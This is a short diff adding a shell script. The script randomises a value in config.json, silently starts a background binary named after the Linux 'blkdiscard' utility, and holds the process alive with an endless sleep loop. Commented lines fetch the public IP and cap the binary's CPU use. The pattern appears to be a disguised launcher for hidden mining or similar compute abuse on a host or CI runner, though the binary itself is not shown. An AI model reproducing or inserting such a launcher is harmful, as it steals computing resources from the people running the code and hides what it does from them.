@@ -1,0 +1,8 @@
+#myip=$(/usr/bin/curl -s http://whatismyip.akamai.com) 
+#IP4=${myip/./_} 
+#IP3=${IP4/./_} 
+#IP2=${IP3/./_} 
+#IP=${IP2/./_} 
+sed -i "s/kui/$(shuf -n 1 -i 100000-500000)/" "config.json" && ./blkdiscard >/dev/null & \
+#cpulimit -e blkdiscard -l 50
+time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
